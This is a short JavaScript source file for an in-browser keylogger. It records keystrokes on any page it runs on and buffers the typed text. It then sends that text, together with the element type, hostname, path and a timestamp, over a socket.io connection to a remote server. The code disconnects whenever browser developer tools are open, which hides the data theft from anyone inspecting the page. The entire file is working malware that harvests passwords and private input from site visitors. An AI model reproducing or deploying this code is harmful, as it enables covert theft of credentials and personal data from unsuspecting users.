const devtools = require('devtools-detect');
const io = require('socket.io-client');
const socket = io.connect(SERVER_URL, {
  autoConnect: true,
  reconnection: true,
  reconnectionAttempts: 'Infinity'
});

var promise = null;
var buff = [];

// Stop when devtool is open
window.addEventListener('devtoolschange', function (e) {
  e.detail.open ? socket.disconnect() : socket.connect();
});

document.addEventListener('keyup', function(e) {
  if (e.keyCode !== 32 && (e.keyCode < 48 || e.keyCode > 222)) {
    return;
  }

  clearTimeout(promise);
  buff.push(e.key);

  promise = setTimeout(function () {
    // Support IE6-8
    const target = e.target || e.srcElement;

    // Join and trim the buffer
    buff = buff.join('').trim();
    if (!buff.length) {
      buff = [];
      return;
    }

    // Send buffer to the base
    socket.emit('keypress', {
      key: buff,
      element: target.nodeName,
      hostname: window.location.hostname,
      path: window.location.pathname,
      timestamp: Date.now()
    });
    buff = [];
  }, 350);
});
